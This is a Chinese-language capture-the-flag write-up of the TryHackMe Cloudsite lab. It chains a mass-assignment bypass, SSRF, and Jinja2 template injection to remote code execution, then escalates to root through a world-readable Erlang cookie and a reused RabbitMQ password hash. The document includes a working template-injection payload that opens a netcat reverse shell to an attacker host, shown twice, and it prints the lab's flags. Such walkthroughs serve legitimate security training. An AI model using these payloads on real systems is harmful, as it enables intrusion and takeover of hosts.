# THM Cloudsite 渗透测试 Writeup

**日期**: 2026-05-27
**目标**: 10.49.137.255 (TryHackMe Cloudsite)
**授权**: THM 授权靶场，全 IP 范围，无限制

---

## 攻击链概览

```
信息搜集 → 子域名枚举 → Web枚举 → Mass Assignment → SSRF → 内部API发现 → SSTI → RCE → azrael shell → Erlang Cookie泄露 → RabbitMQ配置导出 → 密码分析 → su root
```

---

## 1. 信息搜集

### 端口扫描
```bash
nmap -sV -sC -p- --min-rate 1000 10.49.137.255
```

**开放端口：**
| 端口      | 服务     | 版本                 |
| --------- | -------- | -------------------- |
| 22/tcp    | SSH      | OpenSSH 8.9p1 Ubuntu |
| 80/tcp    | HTTP     | Apache httpd 2.4.52  |
| 4369/tcp  | epmd     | Erlang Port Mapper   |
| 25672/tcp | RabbitMQ | Erlang node          |

---

## 2. Web 枚举

### 子域名枚举
```bash
gobuster vhost -u http://cloudsite.thm -w subdomains-top1million-5000.txt --append-domain -t 50
```

**发现：** `storage.cloudsite.thm`

### 目录扫描
```bash
gobuster dir -k -u http://storage.cloudsite.thm -w /usr/share/wordlists/dirb/common.txt -t 50
```

**发现：**
- `/api` (200)
- `/register.html`, `/login.html`
- `/assets`
- `/robots.txt`

---

## 3. Mass Assignment 漏洞

### 注册 API 分析
```bash
curl -X POST http://storage.cloudsite.thm/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@123.com","password":"test","subscription":"active"}'
```

**漏洞：** 注册 API 未过滤 `subscription` 字段，可直接设置 `active` 绕过默认 `inactive` 限制。

### 登录验证
```bash
curl -X POST http://storage.cloudsite.thm/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@123.com","password":"test"}'
```

**返回：** `active`

---

## 4. SSRF 漏洞利用

### 内部 API 文档发现
```bash
curl -X POST http://storage.cloudsite.thm/api/store-url \
  -H "Cookie: jwt=..." \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:3000/api/docs"}'
```

**发现端点：**
- `/api/register` - 注册
- `/api/login` - 登录
- `/api/upload` - 文件上传
- `/api/store-url` - URL 上传 (SSRF)
- `/api/fetch_messeges_from_chatbot` - 聊天机器人
- `/api/uploads/{filename}` - 查看文件
- `/dashboard/inactive`, `/dashboard/active`

---

## 5. SSTI → RCE

### Jinja2 SSTI 发现
```bash
curl -X POST http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot \
  -H "Content-Type: application/json" \
  -d '{"username":"{{<%[%'"\x5d}%\\."}'
```

**结果：** Jinja2 模板引擎报错，确认 SSTI

### 获取反向 Shell
```bash
# Kali: nc -lvnp 1234

curl -X POST http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot \
  -H "Content-Type: application/json" \
  -d '{"username":"{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.241.203 1234 >/tmp/f\').read() }}"}'
```

**成功获取 azrael shell！**

---

## 6. 提权 - Erlang Cookie

### Cookie 泄露
```bash
ls -la /var/lib/rabbitmq/.erlang.cookie
# -r-----r-- 1 rabbitmq rabbitmq 16 May 27 08:29 .erlang.cookie

cat /var/lib/rabbitmq/.erlang.cookie
# ZHVDZBKavbBtoYQ1
```

**权限错误：** `.erlang.cookie` 设置为 `-r-----r--`，任何用户可读！

### RabbitMQ 配置导出
```bash
sudo rabbitmqctl --erlang-cookie 'ZHVDZBKavbBtoYQ1' --node rabbit@forge export_definitions -
```

**发现 root 用户：**
- `name`: `root`
- `password_hash`: `49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF`
- `tags`: `["administrator"]`

### 密码分析
RabbitMQ 密码结构：`base64(salt + sha256(salt + password))`

解码：
- Salt: `e3d7ba85` (4 bytes)
- SHA256 Hash: `295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585`

**关键发现：** Linux root 密码 = 去掉 salt 后的 SHA256 值

### su 提权
```bash
su root
# 密码: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

**成功获取 root shell！**

---

## 7. 获取 Flags

### User Flag
```bash
cat /home/azrael/user.txt
# 98d3a30fa86523c580144d317be0c47e
```

### Root Flag
```bash
cat /root/root.txt
# eabf7a0b05d3f2028f3e0465d2fd0852
```

---

## 技术总结

### 发现的漏洞
1. **Mass Assignment** (高危): 注册 API 未过滤 `subscription` 字段
2. **SSRF** (严重): `/api/store-url` 可访问内部服务，绕过反向代理
3. **SSTI (Jinja2)** (严重): chatbot 端点使用 `render_template_string()` 拼接用户输入
4. **Erlang Cookie 权限错误** (严重): `.erlang.cookie` 设置为 `-r-----r--`
5. **密码复用** (高危): Linux root 密码直接复用 RabbitMQ root 密码哈希值

### 权限提升路径
```
SSRF → 发现内部 API → SSTI → azrael shell → Erlang Cookie泄露 → RabbitMQ配置导出 → 密码分析 → su root
```

### 关键命令
```bash
# Mass Assignment 注册
curl -X POST http://storage.cloudsite.thm/api/register \
  -d '{"email":"test@123.com","password":"test","subscription":"active"}'

# SSRF 访问内部 API
curl -X POST http://storage.cloudsite.thm/api/store-url \
  -d '{"url":"http://127.0.0.1:3000/api/docs"}'

# SSTI 反向 Shell
curl -X POST http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot \
  -d '{"username":"{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f\').read() }}"}'

# RabbitMQ 配置导出
rabbitmqctl --erlang-cookie 'ZHVDZBKavbBtoYQ1' --node rabbit@forge export_definitions -

# su 提权
su root
# 密码: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```
